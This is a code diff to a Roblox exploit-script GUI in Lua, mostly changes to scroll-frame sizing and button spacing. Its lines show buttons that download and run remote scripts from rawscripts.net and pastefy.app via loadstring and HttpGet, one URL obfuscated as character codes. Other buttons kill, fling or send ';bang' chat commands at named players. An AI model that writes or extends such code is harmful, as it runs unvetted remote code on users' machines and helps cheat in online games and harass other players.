@@ -305,7 +305,7 @@ createTabButton("Executor", 110, function()
     containerExec.Visible = true
 end)
 
-createTabButton("Miscellaneous", 220, function()
+createTabButton("Misc", 220, function()
     HideAllTabs()
     containerMisc.Visible = true
 end)
@@ -329,7 +329,7 @@ pluginLayout.Padding = UDim.new(0, 10)
 pluginLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
 pluginLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    scrollPlugins.CanvasSize = UDim2.new(0, 0, 0, pluginLayout.AbsoluteContentSize.Y + 10)
+    scrollPlugins.CanvasSize = UDim2.new(0, 0, 0, pluginLayout.AbsoluteContentSize.Y + 20)
 end)
 
 -- Plugin loader
@@ -373,11 +373,12 @@ if #Plugins > 0 then
     end
 end
 
--- Main tab scrolling frame
+-- Main tab scrolling frame (FIXED: Proper automatic canvas sizing)
 local scrollMain = Instance.new("ScrollingFrame", containerMain)
 scrollMain.Size = UDim2.new(1, 0, 1, 0)
+scrollMain.Position = UDim2.new(0, 0, 0, 0)
 scrollMain.BackgroundTransparency = 1
-scrollMain.ScrollBarThickness = 5
+scrollMain.ScrollBarThickness = 8
 scrollMain.ScrollBarImageColor3 = Color3.fromRGB(102, 0, 0)
 scrollMain.CanvasSize = UDim2.new(0, 0, 0, 0)
 scrollMain.ZIndex = 1
@@ -386,10 +387,13 @@ local mainLayout = Instance.new("UIListLayout", scrollMain)
 mainLayout.Padding = UDim.new(0, 10)
 mainLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
+mainLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    scrollMain.CanvasSize = UDim2.new(0, 0, 0, mainLayout.AbsoluteContentSize.Y + 20)
+end)
+
 local function createButton(parent, text, callback)
     local btn = Instance.new("TextButton", parent)
     btn.Size = UDim2.new(1, -20, 0, 40)
-    btn.Position = UDim2.new(0, 10, 0, 0)
     btn.Text = text
     btn.TextSize = 14
     btn.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
@@ -397,7 +401,6 @@ local function createButton(parent, text, callback)
     btn.Font = Enum.Font.Gotham
     btn.ZIndex = 1
     btn.MouseButton1Click:Connect(callback)
-    return btn
 end
 
 local buttons = {
@@ -883,7 +886,7 @@ local buttons = {
     {"Energize GUI Animations", function() loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-energize-gui-24798"))() end}
 }
 
-for i, item in ipairs(buttons) do
+for _, item in ipairs(buttons) do
     createButton(scrollMain, item[1], item[2])
 end
 
@@ -918,7 +921,7 @@ execButton.MouseButton1Click:Connect(function()
     end)
 end)
 
--- Misc tab
+-- Misc tab (larger scrolling area)
 local playerInput = Instance.new("TextBox", containerMisc)
 playerInput.Size = UDim2.new(1, -20, 0, 30)
 playerInput.Position = UDim2.new(0, 10, 0, 0)
@@ -932,17 +935,21 @@ playerInput.BorderColor3 = Color3.fromRGB(255, 50, 50)
 playerInput.ZIndex = 1
 
 local scrollMisc = Instance.new("ScrollingFrame", containerMisc)
-scrollMisc.Size = UDim2.new(1, 0, 1, -40)
-scrollMisc.Position = UDim2.new(0, 0, 0, 40)
+scrollMisc.Size = UDim2.new(1, -10, 1, -70)  -- Made taller (more space for content)
+scrollMisc.Position = UDim2.new(0, 5, 0, 40)
 scrollMisc.BackgroundTransparency = 1
-scrollMisc.ScrollBarThickness = 5
+scrollMisc.ScrollBarThickness = 8
 scrollMisc.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
 scrollMisc.CanvasSize = UDim2.new(0, 0, 0, 0)
 scrollMisc.ZIndex = 1
 
 local miscLayout = Instance.new("UIListLayout", scrollMisc)
-miscLayout.Padding = UDim.new(0, 10)
+miscLayout.Padding = UDim.new(0, 12)
 miscLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+miscLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    scrollMisc.CanvasSize = UDim2.new(0, 0, 0, miscLayout.AbsoluteContentSize.Y + 30)
+end)
 
 local function findPlayer(name)
     for _, p in pairs(game.Players:GetPlayers()) do
@@ -983,7 +990,7 @@ end
 
 local function createMiscButton(yPos, text, callback)
     local button = Instance.new("TextButton", scrollMisc)
-    button.Size = UDim2.new(1, -20, 0, 30)
+    button.Size = UDim2.new(1, -20, 0, 35)
     button.Position = UDim2.new(0, 10, 0, yPos)
     button.Text = text
     button.Font = Enum.Font.GothamBold
@@ -1006,7 +1013,7 @@ createMiscEntry(yPos, "Player Name", "Bang Player", function(name)
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";bang "..target.Name.." 5", "All")
     end
 end)
-yPos += 40
+yPos += 45
 
 createMiscEntry(yPos, "Player Name", "Fling Player", function(name)
     local target = findPlayer(name)
@@ -1018,7 +1025,7 @@ createMiscEntry(yPos, "Player Name", "Fling Player", function(name)
         game.Debris:AddItem(body, 0.2)
     end
 end)
-yPos += 40
+yPos += 45
 
 createMiscEntry(yPos, "Player Name", "Teleport to Player", function(name)
     local target = findPlayer(name)
@@ -1026,22 +1033,22 @@ createMiscEntry(yPos, "Player Name", "Teleport to Player", function(name)
         LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
     end
 end)
-yPos += 40
+yPos += 45
 
 createMiscEntry(yPos, "WalkSpeed amount", "Set Speed", function(val)
     LocalPlayer.Character.Humanoid.WalkSpeed = val
 end)
-yPos += 40
+yPos += 45
 
 createMiscEntry(yPos, "JumpPower amount", "Set Jumppower", function(val)
     LocalPlayer.Character.Humanoid.JumpPower = val
 end)
-yPos += 40
+yPos += 45
 
 createMiscEntry(yPos, "Gravity amount", "Set Gravity", function(val)
     game.Workspace.Gravity = val
 end)
-yPos += 40
+yPos += 45
 
 createMiscEntry(yPos, "Player Name", "Kill Player", function(name)
     local target = findPlayer(name)
@@ -1049,19 +1056,19 @@ createMiscEntry(yPos, "Player Name", "Kill Player", function(name)
         target.Character.Humanoid.Health = 0
     end
 end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Grab Knife V4", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-Knife-V4-56561"))() end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "[Ancient] NasGUI V1.0", function() loadstring(game:HttpGet("https://pastefy.app/P7a8Lj5Y/raw"))() end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "NasGUI V1.6 Reborn", function()
     local u = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,111,79,71,76,73,85,90,69,47,114,97,119)
     loadstring(game:HttpGet(u))()
 end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Anti-AFK", function()
     local VirtualUser = game:GetService("VirtualUser")
@@ -1070,12 +1077,12 @@ createMiscButton(yPos, "Anti-AFK", function()
         VirtualUser:ClickButton2(Vector2.new())
     end)
 end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "NasGUI Reborn V1.7.6", function()
     loadstring(game:HttpGet("https://pastefy.app/PSwknTJR/raw?part=NasGUI-v1.7.6_REBORN.lua"))()
 end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Clone Yourself", function()
     local plr = LocalPlayer
@@ -1085,42 +1092,34 @@ createMiscButton(yPos, "Clone Yourself", function()
         clone:SetPrimaryPartCFrame(plr.Character:GetPrimaryPartCFrame() + Vector3.new(3,0,0))
     end
 end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Void Disabler", function()
     local VOID_HEIGHT = -math.huge
-    local CHECK_INTERVAL = 0.2
     game:GetService("RunService").Heartbeat:Connect(function()
         for _, player in ipairs(game.Players:GetPlayers()) do
             local char = player.Character
             local root = char and char:FindFirstChild("HumanoidRootPart")
-            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
-            if root and humanoid then
-                if root.Position.Y < VOID_HEIGHT then
-                    root.Velocity = Vector3.zero
-                    root.CFrame = CFrame.new(root.Position.X, 10, root.Position.Z)
-                end
+            if root and root.Position.Y < VOID_HEIGHT then
+                root.Velocity = Vector3.zero
+                root.CFrame = CFrame.new(root.Position.X, 10, root.Position.Z)
             end
         end
     end)
 end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Walk On Walls", function() loadstring(game:HttpGet("https://rawscripts.net/raw/FE-walk-on-walls_206"))() end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Security Cameras", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-Inspired-Camera-Script-17367"))() end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "RC7", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rc7-29631"))() end)
-yPos += 40
+yPos += 45
 
 createMiscButton(yPos, "Fly GUI v3", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Gui-V3-Turkish-48460"))() end)
-yPos += 40
-
-miscLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    scrollMisc.CanvasSize = UDim2.new(0, 0, 0, miscLayout.AbsoluteContentSize.Y)
-end)
+yPos += 45
 
 -- Executor detection notification
 local executorName = "Unknown"
